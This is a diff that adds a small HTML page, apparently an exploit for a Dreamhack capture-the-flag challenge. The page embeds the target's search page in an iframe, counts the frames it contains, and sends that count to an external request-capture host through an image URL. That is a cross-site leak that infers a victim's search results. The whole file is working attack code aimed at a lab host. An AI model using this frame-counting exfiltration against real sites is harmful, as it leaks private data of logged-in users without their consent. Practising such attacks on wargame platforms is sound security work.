@@ -1,0 +1,14 @@
+<html>
+<body>
+<iframe id="iframe"></iframe>
+<img id="img">
+<script>
+const iframe = document.getElementById("iframe");
+iframe.src = "http://host3.dreamhack.games:21041/search?query=DreamHack";
+iframe.onload = () => {
+    img.src = `https://bkienfp.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
+};
+</script>
+</body>
+</html>
+
